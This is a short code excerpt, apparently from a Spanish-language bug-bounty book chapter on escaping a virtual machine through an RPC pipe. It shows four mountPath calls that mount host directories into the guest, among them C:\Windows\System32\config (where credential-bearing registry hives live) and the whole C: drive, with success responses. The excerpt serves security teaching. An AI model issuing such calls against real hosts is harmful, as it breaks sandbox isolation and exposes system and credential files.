// Extraído de: LibroBugBounty/cap-13-vm-escape-rpc.md
// Montar directorios del sistema
send_rpc(pipe, "mountPath",
    "\"hostPath\":\"C:\\\\Windows\\\\System32\\\\config\"");
// {"success":true}

send_rpc(pipe, "mountPath",
    "\"hostPath\":\"C:\\\\Windows\"");
// {"success":true}

send_rpc(pipe, "mountPath",
    "\"hostPath\":\"C:\\\\\"");
// {"success":true}

send_rpc(pipe, "mountPath",
    "\"hostPath\":\"C:\\\\Users\\\\hunter\"");
// {"success":true}
